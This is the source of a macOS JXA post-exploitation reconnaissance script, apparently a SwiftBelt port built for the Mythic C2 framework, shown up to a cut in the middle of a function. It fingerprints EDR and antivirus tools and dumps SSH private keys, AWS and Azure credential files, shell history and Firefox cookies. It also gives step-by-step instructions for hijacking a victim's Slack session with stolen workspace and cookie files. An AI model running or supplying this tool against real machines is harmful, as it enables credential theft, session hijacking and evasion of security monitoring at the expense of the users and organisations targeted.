//  Script Name: jxabelt.js
//  MITRE ATT&CK Technique: [TTP_ID]
//  Author: @darmado | https://x.com/darmad0
//  Credit: https://github.com/cedowens
//  Date: Thu Oct 17 15:57:59 PDT 2024
//  Version: 1.1

//  Description:
//  Inspired by cedowen's original work. This is a more modular version of Swiftbelt.js. 
//  Uses POSIX when interacting with the file system, does a decent job at error handling, literally  
//  Revised a handful of functions  - slightly outdated. 
//  Added more vendors 
//  Can be used with Mythic C2 without making mods. 


ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
ObjC.import('sys/stat');
ObjC.import('unistd');


var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
var fileMan = $.NSFileManager.defaultManager;
var outstring = "";
var DEBUG = false;

const CSSM_ERROR_CODES = {
    "0": "Success – The operation was successful.",
    "-67000": "CSSMERR_TP_CERT_REVOKED (-67000): Certificate has been revoked.",
    "-67001": "CSSMERR_TP_CERT_SUSPENDED (-67001): Certificate is temporarily invalid.",
    "-67002": "CSSMERR_TP_CERT_EXPIRED (-67002): Certificate is expired.",
    "-67003": "CSSMERR_TP_CERT_NOT_VALID_YET (-67003): Certificate is not yet valid.",
    "-67004": "CSSMERR_TP_CERT_REQUIRED (-67004): Certificate is required.",
    "-67005": "CSSMERR_TP_CERT_NOT_VALID_YET (-67005): Certificate is not yet valid.",
    "-67006": "CSSMERR_TP_CERT_INVALID (-67006): Certificate is invalid.",
    "-67007": "CSSMERR_TP_CERT_UNABLE_TO_CHECK_REVOCATION (-67007): Unable to check certificate revocation status.",
    "-67008": "CSSMERR_TP_CERT_REVOCATION_STATUS_UNKNOWN (-67008): Certificate revocation status is unknown.",
    "-67009": "CSSMERR_TP_CERT_REVOKED_REASON_UNSPECIFIED (-67009): Certificate was revoked for an unspecified reason.",
    "-67010": "CSSMERR_TP_INVALID_CERTIFICATE (-67010): Certificate format or data is invalid.",
    "-67011": "CSSMERR_TP_CERT_REVOKED (-67011): Certificate has been revoked.",
    "-67012": "CSSMERR_TP_CERT_POLICY_FAIL (-67012): Certificate does not meet policy requirements.",
    "-67013": "CSSMERR_TP_CERTIFICATE_CANT_VERIFY (-67013): Certificate cannot be verified.",
    "-67014": "CSSMERR_TP_CERT_UNKNOWN (-67014): Certificate is unknown to the verifier.",
    "-67015": "CSSMERR_TP_INVALID_POLICY_IDENTIFIERS (-67015): Certificate has invalid policy identifiers.",
    "-67016": "CSSMERR_TP_NOT_TRUSTED (-67016): Certificate is not trusted by the system.",
    "-67017": "CSSMERR_TP_TRUST_SETTING_DISALLOWS (-67017): Trust setting does not allow validation.",
    "-67018": "CSSMERR_TP_INVALID_ANCHOR_CERT (-67018): Invalid anchor certificate.",
    "-67019": "CSSMERR_TP_INVALID_POLICY_CONSTRAINTS (-67019): Invalid policy constraints.",
    "-67020": "CSSMERR_TP_INVALID_NAME_CONSTRAINTS (-67020): Invalid name constraints.",
    "-67021": "CSSMERR_TP_INVALID_BASIC_CONSTRAINTS (-67021): Invalid basic constraints.",
    "-67022": "CSSMERR_TP_INVALID_AUTHORITY_KEY_ID (-67022): Invalid authority key identifier.",
    "-67023": "CSSMERR_TP_INVALID_SUBJECT_KEY_ID (-67023): Invalid subject key identifier.",
    "-67024": "CSSMERR_TP_INVALID_KEY_USAGE (-67024): Invalid key usage.",
    "-67025": "CSSMERR_TP_INVALID_EXTENDED_KEY_USAGE (-67025): Invalid extended key usage.",
    "-67026": "CSSMERR_TP_INVALID_ID_LINKAGE (-67026): Invalid ID linkage.",
    "-67027": "CSSMERR_TP_PATH_LEN_CONSTRAINT (-67027): Path length constraint violated.",
    "-67028": "CSSMERR_TP_INVALID_ROOT (-67028): Invalid root certificate.",
    "-67029": "CSSMERR_TP_NAME_CONSTRAINTS_VIOLATED (-67029): Name constraints violated.",
    "-67030": "CSSMERR_TP_CERT_CHAIN_TOO_LONG (-67030): Certificate chain is too long.",
    "-67031": "CSSMERR_TP_INVALID_EXTENSION (-67031): Invalid certificate extension.",
    "-67032": "CSSMERR_TP_INVALID_POLICY_MAPPING (-67032): Invalid policy mapping.",
    "-67033": "CSSMERR_TP_INVALID_POLICY_CONSTRAINTS (-67033): Invalid policy constraints.",
    "-67034": "CSSMERR_TP_INVALID_SUBJECT_ALT_NAME (-67034): Invalid subject alternative name.",
    "-67035": "CSSMERR_TP_INCOMPLETE_REVOCATION_CHECK (-67035): Revocation check incomplete; certificate status unknown.",
    "-67036": "CSSMERR_TP_NETWORK_FAILURE (-67036): Network failure during certificate verification.",
    "-67037": "CSSMERR_TP_OCSP_UNAVAILABLE (-67037): OCSP service is unavailable.",
    "-67038": "CSSMERR_TP_OCSP_BAD_RESPONSE (-67038): Bad OCSP response.",
    "-67039": "CSSMERR_TP_OCSP_STATUS_UNRECOGNIZED (-67039): Unrecognized OCSP status.",
    "-67040": "CSSMERR_TP_OCSP_NOT_TRUSTED (-67040): OCSP response is not trusted.",
    "-67041": "CSSMERR_TP_OCSP_INVALID_SIGNATURE (-67041): Invalid OCSP response signature.",
    "-67042": "CSSMERR_TP_OCSP_NONCE_MISMATCH (-67042): OCSP nonce mismatch.",
    "-67043": "CSSMERR_TP_OCSP_SERVER_ERROR (-67043): OCSP server error.",
    "-67044": "CSSMERR_TP_OCSP_REQUEST_NEEDS_SIG (-67044): OCSP request needs signature.",
    "-67045": "CSSMERR_TP_OCSP_UNAUTHORIZED_REQUEST (-67045): Unauthorized OCSP request.",
    "-67046": "CSSMERR_TP_OCSP_UNKNOWN_RESPONSE_STATUS (-67046): Unknown OCSP response status.",
    "-67047": "CSSMERR_TP_OCSP_UNKNOWN_CERT (-67047): Unknown certificate in OCSP response.",
    "-67048": "CSSMERR_TP_OCSP_INVALID_CERT_STATUS (-67048): Invalid certificate status in OCSP response.",
    "-67049": "CSSMERR_TP_OCSP_INVALID_TIME (-67049): Invalid time in OCSP response.",
    "-67050": "CSSMERR_TP_NOT_TRUSTED (-67050): Signature is untrusted or invalid.",
    "-67051": "CSSMERR_TP_INVALID_CRL (-67051): Invalid CRL.",
    "-67052": "CSSMERR_TP_CRL_EXPIRED (-67052): CRL has expired.",
    "-67053": "CSSMERR_TP_CRL_NOT_VALID_YET (-67053): CRL is not yet valid.",
    "-67054": "CSSMERR_TP_CERT_EXPIRED (-67054): The signing certificate has expired.", //TODO: Verify  with Apple Dev Docs
    "-67055": "CSSMERR_TP_CRL_NOT_FOUND (-67055): CRL not found.",
    "-67056": "CSSMERR_TP_CRL_SERVER_DOWN (-67056): CRL server is down.",
    "-67057": "CSSMERR_TP_CRL_BAD_URI (-67057): Bad CRL URI.",
    "-67058": "CSSMERR_TP_UNKNOWN_CERT_AUTHORITY (-67058): Unknown certificate authority.",
    "-67059": "CSSMERR_TP_UNKNOWN_SIGNER (-67059): Unknown signer.",
    "-67060": "CSSMERR_TP_CERT_BAD_ACCESS_LOCATION (-67060): Bad certificate access location.",
    "-67061": "CSSMERR_TP_UNKNOWN (-67061): A general or unspecified error occurred with the trust policy.",
    "-67062": "CSSMERR_TP_INCOMPLETE (-67062): The operation is incomplete due to missing data or resources.",
    "-67063": "CSSMERR_TP_INVALID_POLICY_MAPPING (-67063): Invalid policy mapping.",
    "-67064": "CSSMERR_TP_INVALID_POLICY_CONSTRAINTS (-67064): Invalid policy constraints.",
    "-67065": "CSSMERR_TP_INVALID_INHIBIT_ANY_POLICY (-67065): Invalid inhibit any policy.",
    "-67066": "CSSMERR_TP_INVALID_SUBJECT_ALT_NAME (-67066): Invalid subject alternative name.",
    "-67067": "CSSMERR_TP_INVALID_EMPTY_SUBJECT (-67067): Invalid empty subject.",
    "-67068": "CSSMERR_TP_HOSTNAME_MISMATCH (-67068): The certificate hostname does not match the expected hostname.",
    "-67069": "CSSMERR_TP_INVALID_POLICY_IDENTIFIERS (-67069): Invalid policy identifiers.",
    "-67070": "CSSMERR_TP_INVALID_BASIC_CONSTRAINTS (-67070): Invalid basic constraints.",
    "-67071": "CSSMERR_TP_INVALID_NAME_CONSTRAINTS (-67071): Invalid name constraints.",
    "-67072": "CSSMERR_TP_CERTIFICATE_UNKNOWN (-67072): The certificate is unknown or unrecognized.",
    "-67073": "CSSMERR_TP_VERIFY_ACTION_FAILED (-67073): Verification of the specified action failed.",
    "-67074": "CSSMERR_TP_INVALID_CRL_DIST_POINT (-67074): Invalid CRL distribution point.",
    "-67075": "CSSMERR_TP_INVALID_CRL_DIST_POINT_NAME (-67075): Invalid CRL distribution point name.",
    "-67076": "CSSMERR_TP_INVALID_CRL_REASON (-67076): Invalid CRL reason.",
    "-67077": "CSSMERR_TP_INVALID_CRL_ISSUER (-67077): Invalid CRL issuer.",
    "-67078": "CSSMERR_TP_INVALID_ANCHOR_CERT (-67078): The anchor certificate is invalid or untrusted.",
    "-67079": "CSSMERR_TP_INVALID_SIGNATURE (-67079): The certificate signature is invalid.",
    "-67080": "CSSMERR_TP_NO_DEFAULT_KEYCHAIN (-67080): No default keychain is available for validation."
};

function printHelp() {
    console.log(`SwiftBelt Usage:
        -all                 Run all checks
        -tcc                 Run TCC check
        -securitytools       Discover security tools and related information
        -sysinfo             Run system info check
        -clipboard           Dump clipboard contents
        -running             List running applications
        -listusers           List local user accounts
        -launchagents        List launch agents and daemons
        -history             Check command history
        -slack               Search Slack data
        -installed           List installed applications
        -firefox             Check Firefox cookies
        -lock                Check screen lock status
        -sticky              Check Sticky Notes
        -textedit            Check TextEdit autosave
        -cred                Search for credentials
        -help                Print this help message
        -debug               Enable debug logging
        -codesign            Check code signing for all apps in /Applications/
        -codesignapp <path>  Check code signing for a specific app
        -safarihistory       Retrieve Safari browser history (may require Full Disk Access)
        -safaridbs           List Safari-related databases`);
        }


// Arg Map
function Discover(functionString) {
    debugLog("Entering Discover function");
    var outstring = "";
    var functionMap = {
        "tcc": TCCCheck,
        "securitytools": SecurityToolsCheck,
        "sysinfo": SysInfo,
        "clipboard": Clipboard,
        "running": RunningApps,
        "listusers": ListUsers,
        "launchagents": LaunchAgents,
        "history": History,
        "slack": SlackSearch,
        "installed": InstalledApps,
        "firefox": FirefoxCookies,
        "lock": LockCheck,
        "sticky": StickyNotes,
        "textedit": TextEditCheck,
        "cred": CredSearch,
        "codesign": checkAllAppsCodeSigning,
        "safarihistory": SafariHistory,
        "safaridbs": safaridbs,
    };

    var funcs = functionString.split(',');

    debugLog(`Functions to execute: ${funcs}`);

    for (var i = 0; i < funcs.length; i++) {
        var funcName = funcs[i].trim().toLowerCase();
        debugLog(`Attempting to execute function: ${funcName}`);
        if (functionMap.hasOwnProperty(funcName)) {
            debugLog(`Calling function: ${funcName}`);
            outstring += functionMap[funcName]();
        } else {
            outstring += "Unknown function: " + funcs[i] + "\n";
        }
    }

    debugLog("Exiting Discover function");
    return outstring;
}

function Checks(functionString) {
    return Discover(functionString);
}

// Expose Checks function globally for Mythic C2
this.Checks = Checks;


//  Santa's little helper:  permission check function
// Using syscall POSIX access() for permission checks offers lower-level OS access,
// faster execution, granular control, cross-system consistency, and reduced API footprint compared to NSFileManager.
function checkPOSIXAccess(filepath, mode) {
    var access = 0;
    switch(mode) {
        case 'r': access = 4; break;  // POSIX R_OK
        case 'w': access = 2; break;  // POSIX W_OK
        case 'x': access = 1; break;  // POSIX X_OK
        default: return false;
    }
    if ($.access(filepath, access) === 0) {
        return true;
    } else {
        debugLog(`Permission check failed for ${filepath} with mode ${mode}`);
        return false;
    }
}

// TODO: Better to dynamcially generate App dir by using NSSearchPathDirectory
// https://developer.apple.com/documentation/foundation/nssearchpathdirectory

function SecurityToolsCheck(){
    debugLog("Starting SecurityToolsCheck");
    var results = "";
    var runningProcesses = getRunningProc();
    
    debugLog("Checking security tools");
    var securityTools = [
        {name: "Carbon Black", proc: ["CbOsxSensorService", "CbDefense"], dir: ["/Applications/CarbonBlack/CbOsxSensorService", "/Applications/Confer.app"]},
        {name: "CrowdStrike Falcon", proc: ["falconctl", "falcon-sensor"], dir: ["/Library/CS/falcond", "/Applications/Falcon.app"]},
        {name: "FireEye HX", proc: ["xagt", "xagtnotif"], dir: ["/Library/FireEye/xagt", "/Applications/FireEye Endpoint Security.app"]},
        {name: "Sophos", proc: ["SophosScanD", "SophosServiceManager"], dir: ["/Library/Sophos Anti-Virus/", "/Applications/Sophos/"]},
        {name: "SentinelOne", proc: ["SentinelAgent", "SentinelCtl"], dir: ["/Applications/SentinelOne/SentinelAgent.app", "/Library/Sentinel/"]},
        {name: "Cylance", proc: ["CylanceSvc", "CylanceUI"], dir: ["/Library/Application Support/Cylance/Desktop", "/Applications/Cylance/"]},
        {name: "Trend Micro", proc: ["iCoreService", "tmsm"], dir: ["/Library/Application Support/TrendMicro", "/Applications/Trend Micro Security.app"]},
        {name: "Symantec", proc: ["SymDaemon", "Norton"], dir: ["/Applications/Symantec Solutions/", "/Library/Application Support/Symantec/"]},
        {name: "McAfee", proc: ["masvc", "MFEFirewall"], dir: ["/Library/McAfee/agent/bin", "/Applications/McAfee Endpoint Security for Mac.app"]},
        {name: "JAMF", proc: ["jamf", "JamfDaemon"], dir: ["/usr/local/jamf/bin/jamf", "/Library/Application Support/JAMF/"]},
        {name: "Malwarebytes", proc: ["Malwarebytes", "mbam"], dir: ["/Applications/Malwarebytes.app", "/Library/Application Support/Malwarebytes"]},
        {name: "ESET", proc: ["esets_daemon", "eset_service"], dir: ["/Applications/ESET.app", "/Library/Application Support/ESET/"]},
        {name: "Avast", proc: ["AvastUI", "com.avast.daemon"], dir: ["/Applications/Avast.app", "/Library/Application Support/Avast/"]},
        {name: "Bitdefender", proc: ["bdservicehost", "BitdefenderAgent"], dir: ["/Applications/Bitdefender.app", "/Library/Bitdefender/"]},
        {name: "Kaspersky", proc: ["AVP", "kav"], dir: ["/Applications/Kaspersky.app", "/Library/Application Support/Kaspersky Lab/"]},
        {name: "LuLu", proc: ["LuLu"], dir: ["/Library/Objective-See/LuLu", "/Applications/LuLu.app"]},
        {name: "KnockKnock", proc: ["KnockKnock"], dir: ["/Applications/KnockKnock.app"]},
        {name: "ReiKey", proc: ["ReiKey"], dir: ["/Applications/ReiKey.app"]},
        {name: "OverSight", proc: ["OverSight"], dir: ["/Applications/OverSight.app"]},
        {name: "BlockBlock", proc: ["BlockBlock"], dir: ["/Applications/BlockBlock Helper.app"]},
        {name: "Netiquette", proc: ["Netiquette"], dir: ["/Applications/Netiquette.app"]},
        {name: "ProcessMonitor", proc: ["ProcessMonitor"], dir: ["/Applications/ProcessMonitor.app"]},
        {name: "FileMonitor", proc: ["FileMonitor"], dir: ["/Applications/FileMonitor.app"]},
        {name: "Red Canary Mac Monitor", proc: [" com.redcanary.agent.securityextension"], dir: ["/Applications/Red Canary Mac Monitor.app"]}
    ];

    securityTools.forEach((tool, index) => {
        debugLog(`Checking tool ${index + 1}/${securityTools.length}: ${tool.name}`);
        var isInstalled = tool.dir.some(path => checkPOSIXAccess(path, 'r'));
        var runningProcs = runningProcesses.filter(proc => 
            // Bug Fix: yoyo,  always check execPaths for pids, no short cuts !!! - 
            tool.proc.some(toolProc => proc.executablePath.toLowerCase().includes(toolProc.toLowerCase()) || proc.executablePath.toLowerCase().includes(tool.name.toLowerCase()))
        );
        var isRunning = runningProcs.length > 0;
        
        if (isInstalled || isRunning || DEBUG) {
            results += `[*] ${tool.name}:\n`;
            results += `    Status: ${isRunning ? "Running" : "Not Running"}\n`;
            results += `    Installed: ${isInstalled ? "Yes" : "No"}\n`;
            
            if (isInstalled) {
                var installedPaths = tool.dir.filter(path => checkPOSIXAccess(path, 'r'));
                results += `    Installed Paths: ${installedPaths.join(", ")}\n`;
                
                // Add back POSIX permission checks
                installedPaths.forEach(path => {
                    var canRead = checkPOSIXAccess(path, 'r');
                    var canWrite = checkPOSIXAccess(path, 'w');
                    var canExecute = checkPOSIXAccess(path, 'x');
                    results += `    Permissions for ${path}: ${canRead ? 'R' : '-'}${canWrite ? 'W' : '-'}${canExecute ? 'X' : '-'}\n`;
                    
                    if (canWrite) {
                        results += `    [!] ${path} is writable, potential security risk\n`;
                    }
                });
            }
            
            if (isRunning) {
                results += "    Running Processes:\n";
                runningProcs.forEach(proc => {
                    results += `      PID: ${proc.pid}; exec: ${proc.executablePath}\n`;
                });
            }
            
            results += "\n";
        } else {
            debugLog(`${tool.name} is not installed or running`);
        }
    });

    debugLog("SecurityToolsCheck completed");
    return results;
}

function getToolVersion(path) {
    // This is a placeholder. In practice, you'd need to implement
    // specific version checking logic for each tool.
    return null;
}

function getLaunchAgents() {
    var launchAgentPaths = [
        "/Library/LaunchAgents",
        "/Library/LaunchDaemons",
        $.NSHomeDirectory() + "/Library/LaunchAgents"
    ];
    
    var agents = [];
    launchAgentPaths.forEach(path => {
        if (checkPOSIXAccess(path, 'r')) {
            var items = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(path, $()));
            agents = agents.concat(items.map(item => path + "/" + item));
        }
    });
    
    return agents;
}

// Utility Function
function getRunningProc() {
    var proc = [];
    var workspace = $.NSWorkspace.sharedWorkspace;
    var runningApps = workspace.runningApplications;
    
    for (var i = 0; i < runningApps.count; i++) {
        var app = runningApps.objectAtIndex(i);
        proc.push({
            name: app.localizedName.js,
            bundleIdentifier: app.bundleIdentifier.js,
            pid: app.processIdentifier,
            executablePath: ObjC.unwrap(app.executableURL.path)
        });
    }
    
    return proc;
}


function getFileAttributes(path) {
    var fileManager = $.NSFileManager.defaultManager;
    var error = $();
    var attributes = fileManager.attributesOfItemAtPathError(path, error);
    
    if (attributes) {
        return {
            creationDate: ObjC.unwrap(attributes.objectForKey('NSFileCreationDate')),
            modificationDate: ObjC.unwrap(attributes.objectForKey('NSFileModificationDate')),
            size: ObjC.unwrap(attributes.objectForKey('NSFileSize'))
        };
    }
    return null;
}

function checkXProtectAndMRT() {
    var results = "";
    try {
        // Check XProtect
        var xprotectPath = "/System/Library/CoreServices/XProtect.bundle";
        if (checkPOSIXAccess(xprotectPath, 'r')) {
            results += "[+] XProtect is present\n";
        }

        // Check MRT (Malware Removal Tool)
        var mrtPath = "/System/Library/CoreServices/MRT.app";
        if (checkPOSIXAccess(mrtPath, 'r')) {
            results += "[+] Malware Removal Tool (MRT) is present\n";
        }
    } catch (error) {
        results += "Error checking XProtect and MRT: " + error + "\n";
    }
    return results;
}

function checkApplicationFirewall() {
    var results = "";
    try {
        var firewallConfig = $.NSUserDefaults.alloc.initWithSuiteName('com.apple.alf');
        var firewallStatus = firewallConfig.objectForKey('globalstate');
        if (firewallStatus === 1 || firewallStatus === 2) {
            results += "[+] macOS Application Firewall is enabled\n";
        }
    } catch (error) {
        results += "Error checking Application Firewall: " + error + "\n";
    }
    return results;
}

function SysInfo(){
    var results = "";
    results += "=====>System Info Check:\n";
    try {
        var env1 = currentApp.systemAttribute('__CFBundleIdentifier');
        var env2 = currentApp.systemAttribute('XPC_SERVICE_NAME');
        var env3 = currentApp.systemAttribute('PACKAGE_PATH');
        if(env1){
            results += "\n----> Current Callback Context:\n";
            results += (env1);
            results += '\n\n';
        }
        if(env2){
            if(env2 != "0"){
                results += "----> Current Callback Context:\n";
                results += (env2);
                results += '\n\n';
            }
        }
        if(env3){
            results += "----> Current Callback Context:\n";
            results += (env3);
            results += '\n\n';
        }
        var accessibility = $.AXIsProcessTrusted();
        results += "\n------> Accessibility TCC Check:\n";
        if(accessibility){
            results += "[+] Your current app context DOES have Accessibility TCC permissions.\n"
        }
        else {
            results += "[-] Your current app context does NOT have Accessibility TCC permissions.\n"
        }
        var curruser = currentApp.systemInfo().shortUserName;
        results += "[+] Current username: " + curruser + "\n\n";
        var machinename = ObjC.deepUnwrap($.NSHost.currentHost.localizedName);
        results += "[+] Hostname: " + machinename + "\n\n";
        localusers = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError('/Users', $()));
        results += "[+] Local user accounts:\n";
        for (k = 0; k < localusers.length; k++){
            results += localusers[k];
            results += "\n";
        }
        results += "\n";
        var addresses = ObjC.deepUnwrap($.NSHost.currentHost.addresses);
        results += "[+] Local IP Addresses:\n";
        for (i = 0; i < addresses.length; i++){
            results += addresses[i];
            results += "\n";
        }
        // ... (add the rest of the system info checks from the original script)
    }
    catch(err){
        results += err;
    }
    results += "#######################################\n";
    return results;
}

function CredSearch(){
    var results = "";
    var curruser = currentApp.systemInfo().shortUserName;
    var sshpath = "/Users/" + curruser + "/.ssh";
    if (fileMan.fileExistsAtPath(sshpath)){
        results += "\n[+] Local SSH cred search:\n";
        let enumerator = ObjC.deepUnwrap((fileMan.enumeratorAtPath(sshpath)).allObjects);
        try{
            for (p = 0; p < enumerator.length; p++){
                results += enumerator[p] + ":" + "\n";
                fullpath = sshpath + "/" + enumerator[p];
                var filedata = $.NSString.stringWithContentsOfFileEncodingError(fullpath,$.NSUTF8StringEncoding, $()).js;
                results += filedata;
                results += "\n";
            }
        }
        catch(err){
            results += err;
        }
    }
    //aws
    var awspath = "/Users/" + curruser + "/.aws";
    if (fileMan.fileExistsAtPath(awspath)){
        results += "\n[+] Local aws cred search:\n";
        let enumerator = ObjC.deepUnwrap((fileMan.enumeratorAtPath(awspath)).allObjects);
        try{
            for (p = 0; p < enumerator.length; p++){
                results += enumerator[p] + ":" + "\n";
                fullpath = awspath + "/" + enumerator[p];
                var filedata = $.NSString.stringWithContentsOfFileEncodingError(fullpath,$.NSUTF8StringEncoding, $()).js;
                results += filedata;
                results += "\n";
            }
        }
        catch(err){
            results += err;
        }
    }
    //azure
    var azpath = "/Users/" + curruser + "/.azure";
    var azpath2 = "/Users/" + curruser + "/.azure" + "/azureProfile.json";
    if (fileMan.fileExistsAtPath(azpath)){
        try{
            results += "\n[+] Local azure cred search:\n";
            results += "[azureProfile.json]";
            results += "\n";
            var contents = $.NSString.stringWithContentsOfFileEncodingError(azpath2,$.NSUTF8StringEncoding, $()).js;
            results += contents;
            results += "\n";
        }
        catch(err){
            results += err;
            results += "\n";
        }
    }
    results += "#######################################\n";
    return results;
}

function RunningApps() {
    var results = "";
    results += "=====>Running Apps:\n";
    try {
        var appsinfo = $.NSWorkspace.sharedWorkspace.runningApplications.js;
        var appsByOwner = {};

        for (let i = 0; i < appsinfo.length; i++) {
            let app = appsinfo[i];
            var attributes = $.NSFileManager.defaultManager.attributesOfItemAtPathError(app.executableURL.path, null);
            var owner = attributes ? attributes.objectForKey('NSFileOwnerAccountName').js : "Unknown";

            if (!appsByOwner[owner]) {
                appsByOwner[owner] = [];
            }
            appsByOwner[owner].push(app);
        }

        for (let owner in appsByOwner) {
            results += "\nOwner: " + owner + "\n";
            appsByOwner[owner].forEach((app, index) => {
                results += (index + 1) + ". " + app.localizedName.js + "\n";
                results += "   PID: " + app.processIdentifier + "\n";
                results += "   Bundle ID: " + app.bundleIdentifier.js + "\n";
                results += "   Executable Path: " + app.executableURL.path.js + "\n";
                results += "   Launch Date: " + (app.launchDate ? app.launchDate.js : "Undefined") + "\n";
                results += "   Is Hidden: " + app.hidden + "\n";
                results += "   Is Terminated: " + app.terminated + "\n";
                results += "   Is Front Most: " + (app.frontmost !== undefined ? app.frontmost : "Undefined") + "\n";
                
                // Check if app is configured to launch at startup
                var launchAgentPath = `/Library/LaunchAgents/${app.bundleIdentifier.js}.plist`;
                var launchDaemonPath = `/Library/LaunchDaemons/${app.bundleIdentifier.js}.plist`;
                if ($.NSFileManager.defaultManager.fileExistsAtPath(launchAgentPath) || 
                    $.NSFileManager.defaultManager.fileExistsAtPath(launchDaemonPath)) {
                    results += "   Launch at Startup: Yes\n";
                } else {
                    results += "   Startup: No\n";
                }
                
                // Check if app is configured to restart if killed
                var plistPath = $.NSFileManager.defaultManager.fileExistsAtPath(launchAgentPath) ? launchAgentPath : launchDaemonPath;
                if (plistPath) {
                    try {
                        var plistContents = $.NSString.stringWithContentsOfFileEncodingError(plistPath, $.NSUTF8StringEncoding, $());
                        if (plistContents && plistContents.js && plistContents.js.includes('<key>KeepAlive</key>')) {
                            results += "   Restart if Killed: Yes\n";
                        } else {
                            results += "   Restart if Killed: No\n";
                        }
                    } catch (plistError) {
                        results += "   Restart if Killed: Error reading plist\n";
                    }
                } else {
                    results += "   Restart if Killed: Unknown\n";
                }
                
                results += "\n";
            });
        }
    } catch (err) {
        results += "Error: " + err + "\n";
    }
    results += "#######################################\n";
    return results;
}

function History(){
    var results = "";
    var curruser = currentApp.systemInfo().shortUserName;
    var zpath = ("/Users/darmado/.zsh_history");

    if (fileMan.fileExistsAtPath(zpath)){
            try{
            results += "\n[+] Local zsh history search for " +  curruser + "\n";
            results += "\n"
            results += "[.zsh_history]";
            results += "\n";
                    var contents =$.NSString.stringWithContentsOfFileEncodingError(zpath,$.NSUTF8StringEncoding, $()).js;
            results += contents;
            results += "\n";

            }
            catch(err){
                    results += err;
                    results += "\n";
            }

    }

    results += "#######################################\n";
    return results
}


function SlackSearch(){
    var results = "";
    var curruser = currentApp.systemInfo().shortUserName;
    var sdPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-downloads";
    var swPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-workspaces";
    var canary = 0;
    if (fileMan.fileExistsAtPath(sdPath)){
        canary = canary + 1;
        try{
            results += "\n[+] Slack downloads data search:\n";
            results += "[slack-downloads]";
            results += "\n";
            var contents = $.NSString.stringWithContentsOfFileEncodingError(sdPath,$.NSUTF8StringEncoding, $()).js;
            var contents2 = String(contents);
            var contents3 = contents2.split(",");
            for(q = 0; q < contents3.length; q++){
                if(contents3[q].includes("http")){
                    results += "==> " + contents3[q] + "\n";
                }
            }
        }
        catch(err){
            results += err;
            results += "\n";
        }
    }
    if (fileMan.fileExistsAtPath(swPath)){
        canary = canary + 1;
        try{
            results += "\n[+] Slack workspaces data search:\n";
            results += "[slack workspaces]";
            results += "\n";
            var contents = $.NSString.stringWithContentsOfFileEncodingError(swPath,$.NSUTF8StringEncoding, $()).js;
            var contents2 = String(contents);
            var contents3 = contents2.split(",");
            for(q = 0; q < contents3.length; q++){
                if(contents3[q].includes("domain")){
                    results += "==> " + contents3[q] + "\n";
                }
                if(contents3[q].includes("name")){
                    results += contents3[q] + "\n";
                }
            }
            results += "\nSteps from Cody's article to load the Slack files found:\n1. Pull the slack-workspaces and Cookies files from the host.\n2. Install a new instance of slack (but don't sign in to anything)\n3. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim\n4. Start Slack";
        }
        catch(err){
            results += err;
            results += "\n";
        }
    }
    if (canary == 0) {
        results += "#######################################\n[-] Slack not found on this host\n";
    }
    results += "#######################################\n";
    return results;
}

function InstalledApps(){
    var results = "";
    var ipath = '/private/var/db/receipts';
    if (fileMan.fileExistsAtPath(ipath)){
        results += "\n[+] Info on installers and apps:\n";
        let items = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ipath,$()));
        try{
            for (p=0; p < items.length; p++){
                results += items[p] + '\n';
            }
        }
        catch(err){
            results += err;
        }
    }
    results += "#######################################\n";
    return results;
}

function FirefoxCookies() {
    var results = "";
    var username = $.NSUserName().js;
    var ffoxpath = `/Users/${username}/Library/Application Support/Firefox/Profiles`;
    
    if (fileMan.fileExistsAtPath(ffoxpath)) {
        results += "\n[+] Firefox cookies.sqlite:\n";
        let prof_folders = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ffoxpath, $()));
        
        try {
            for (let p = 0; p < prof_folders.length; p++) {
                if (prof_folders[p].includes('-release')) {
                    var changeto = ffoxpath + "/" + prof_folders[p];
                    var cookiesPath = changeto + "/cookies.sqlite";
                    
                    if (fileMan.fileExistsAtPath(cookiesPath)) {
                        results += `\nTesting SQLite3 library method:\n`;
                        results += testSQLiteLibrary(cookiesPath);
                        
                        results += `\nTesting NSTask method:\n`;
                        results += testNSTask(cookiesPath);
                    } else {
                        results += `Cookies file not found in profile: ${prof_folders[p]}\n`;
                    }
                }
            }
        } catch (error) {
            results += "Error processing Firefox cookies: " + error + "\n";
        }
    } else {
        results += "Firefox profile directory not found.\n";
    }
    
    results += "#######################################\n";
    return results;
}

function testSQLiteLibrary(cookiesPath) {
    let result = "";
    try {
        ObjC.import('sqlite3');
        var db = Ref();
        var stmt = Ref();
        var rc = $.sqlite3_open(cookiesPath, db);
        if (rc === $.SQLITE_OK) {
            var sql = "SELECT name, value, host, path, datetime(expiry,'unixepoch') as expiredate, isSecure, isHttpOnly, sameSite FROM moz_cookies LIMIT 10;";
            rc = $.sqlite3_prepare_v2(db[0], sql, -1, stmt, null);
            if (rc === $.SQLITE_OK) {
                while ($.sqlite3_step(stmt[0]) === $.SQLITE_ROW) {
                    for (let i = 0; i < $.sqlite3_column_count(stmt[0]); i++) {
                        result += ObjC.unwrap($.sqlite3_column_text(stmt[0], i)) + " | ";
                    }
                    result += "\n";
                }
            } else {
                result += `Error preparing statement: ${$.sqlite3_errmsg(db[0])}\n`;
            }
            $.sqlite3_finalize(stmt[0]);
        } else {
            result += `Error opening database: ${$.sqlite3_errmsg(db[0])}\n`;
        }
        $.sqlite3_close(db[0]);
    } catch (error) {
        result += `Error in SQLite library method: ${error}\n`;
    }
    return result;
}

function testNSTask(cookiesPath) {
    let result = "";
    try {
        var task = $.NSTask.alloc.init;
        task.executableURL = $.NSURL.fileURLWithPath("/usr/bin/sqlite3");
        
        var query = "SELECT name, value, host, path, datetime(expiry,'unixepoch') as expiredate, isSecure, isHttpOnly, sameSite FROM moz_cookies LIMIT 10;";
        task.arguments = [cookiesPath, query];

        var pipe = $.NSPipe.pipe;
        task.standardOutput = pipe;
        task.standardError = pipe;

        task.launch;
        task.waitUntilExit;

        var data = pipe.fileHandleForReading.readDataToEndOfFile;
        var output = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

        result += output;
    } catch (error) {
